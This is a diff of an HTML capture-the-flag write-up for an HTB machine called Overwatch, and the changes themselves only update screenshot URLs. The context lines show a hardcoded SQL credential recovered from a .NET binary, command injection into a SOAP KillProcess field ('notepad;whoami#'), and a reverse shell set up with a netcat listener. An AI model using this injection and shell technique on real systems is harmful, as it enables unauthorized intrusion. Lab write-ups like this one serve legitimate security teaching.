@@ -344,7 +344,7 @@ getting file \Monitoring\overwatch.exe.config of size 2163 as overwatch.exe.conf
 </blockquote>
 <h3 id="net-reverse-engineering">.NET Reverse Engineering</h3>
 <p><a href="https://github.com/dnSpy/dnSpy">DNSpy</a> is the standard tool for .NET reverse engineering. Unlike native compiled languages (C, C++), .NET assemblies compile to <a href="https://learn.microsoft.com/en-us/dotnet/standard/managed-code">CIL (Common Intermediate Language)</a> bytecode rather than machine code. This means they can be decompiled almost perfectly back to C# source — no reading raw assembly required. We open <code>overwatch.exe</code> in DNSpy and browse the decompiled source tree. Inside the application logic, we find a database connection string with credentials hardcoded directly in the source:</p>
-<img alt="DNSpy decompiled source showing hardcoded SQL Server credentials inside overwatch.exe" src="https://raw.githubusercontent.com/zirov/images/refs/heads/main/writeups/overwatch-htb/img01.png" />
+<img alt="DNSpy decompiled source showing hardcoded SQL Server credentials inside overwatch.exe" src="https://raw.githubusercontent.com/z1rov/images/refs/heads/main/overwatch/img01.png" />
 <p><strong>Credentials found:</strong> <code>sqlsvc : TI0LKcfHzZw1Vv;</code></p>
 <blockquote>
 <p><strong>Note:</strong> Hardcoded credentials inside compiled binaries are a surprisingly common finding. Developers sometimes embed connection strings thinking compiled code is "safe" and won't be read by end users. Here, the binary was deployed to a network share with guest read access — compounding the misconfiguration significantly. This is a textbook case of <a href="https://cwe.mitre.org/data/definitions/798.html">CWE-798: Use of Hard-coded Credentials</a>.</p>
@@ -513,11 +513,11 @@ Info: Upload successful!
 <p>Port 8000 is now accessible locally at <code>http://127.0.0.1:8000</code>.</p>
 <h3 id="soap-service-enum">SOAP Service Enum</h3>
 <p>Browsing to <code>http://127.0.0.1:8000/MonitorService</code> confirms what the config file had already told us — a <a href="https://learn.microsoft.com/en-us/dotnet/framework/wcf/whats-wcf">WCF (Windows Communication Foundation)</a> SOAP service is running here:</p>
-<img alt="MonitorService WCF SOAP service running internally on port 8000, accessed after tunneling with Chisel" src="https://raw.githubusercontent.com/zirov/images/refs/heads/main/writeups/overwatch-htb/img02.png" />
+<img alt="MonitorService WCF SOAP service running internally on port 8000, accessed after tunneling with Chisel" src="https://raw.githubusercontent.com/z1rov/images/refs/heads/main/overwatch/img02.png" />
 <p><a href="https://www.w3.org/TR/soap/">SOAP (Simple Object Access Protocol)</a> is an XML-based messaging protocol used to expose remote functionality over HTTP. We enumerate the available operations by fetching the <a href="https://www.w3.org/TR/wsdl/">WSDL (Web Services Description Language)</a> definition — the machine-readable contract that describes every method, input parameter, and return type the service exposes:</p>
 <pre><code>http://127.0.0.1:8000/MonitorService?singleWsdl
 </code></pre>
-<img alt="WSDL definition of the MonitorService showing all available operations including KillProcess with its processName parameter" src="https://raw.githubusercontent.com/zirov/images/refs/heads/main/writeups/overwatch-htb/img03.png" />
+<img alt="WSDL definition of the MonitorService showing all available operations including KillProcess with its processName parameter" src="https://raw.githubusercontent.com/z1rov/images/refs/heads/main/overwatch/img03.png" />
 <p>The WSDL reveals a <code>KillProcess</code> operation that accepts a single string parameter named <code>processName</code>. Any operation that takes a free-form string and passes it to a system-level function is an immediate command injection candidate.</p>
 <h3 id="soap-command-injection">SOAP Command Injection</h3>
 <p><strong>Vulnerability:</strong> Unsanitized command injection in the <code>KillProcess</code> SOAP operation.</p>
@@ -539,9 +539,9 @@ Content-Length: 278
 &lt;/soap:Envelope&gt;
 </code></pre>
 <p>The injection logic works as follows: <code>notepad</code> satisfies the expected process name argument; <code>;</code> terminates that command; <code>whoami</code> is our injected command; <code>#</code> comments out any trailing arguments the service may append after our input.</p>
-<img alt="SOAP service response confirming whoami output as NT AUTHORITY\SYSTEM, proving the command injection works" src="https://raw.githubusercontent.com/zirov/images/refs/heads/main/writeups/overwatch-htb/img04.png" />
+<img alt="SOAP service response confirming whoami output as NT AUTHORITY\SYSTEM, proving the command injection works" src="https://raw.githubusercontent.com/z1rov/images/refs/heads/main/overwatch/img04.png" />
 <p>With confirmed command execution as SYSTEM, we generate a reverse shell payload using <a href="https://www.revshells.com/">Reverse Shell Generator</a> and deliver it through <a href="https://portswigger.net/burp">Burp Suite</a> Repeater:</p>
-<img alt="Reverse shell payload generated and loaded into Burp Suite Repeater targeting the KillProcess parameter" src="https://raw.githubusercontent.com/zirov/images/refs/heads/main/writeups/overwatch-htb/img05.png" />
+<img alt="Reverse shell payload generated and loaded into Burp Suite Repeater targeting the KillProcess parameter" src="https://raw.githubusercontent.com/z1rov/images/refs/heads/main/overwatch/img05.png" />
 <pre><code class="lang-http">POST /MonitorService HTTP/1.1
 Host: 127.0.0.1:8000
 Content-Type: text/xml; charset=utf-8
@@ -557,7 +557,7 @@ Content-Length: 278
   &lt;/soap:Body&gt;
 &lt;/soap:Envelope&gt;
 </code></pre>
-<img alt="Burp Suite Repeater showing the full SOAP request with the reverse shell injected into processName, ready to fire" src="https://raw.githubusercontent.com/zirov/images/refs/heads/main/writeups/overwatch-htb/img06.png" />
+<img alt="Burp Suite Repeater showing the full SOAP request with the reverse shell injected into processName, ready to fire" src="https://raw.githubusercontent.com/z1rov/images/refs/heads/main/overwatch/img06.png" />
 <pre><code class="lang-bash">nc -lnvp 9001
 </code></pre>
 <pre><code>Listening on 0.0.0.0 9001
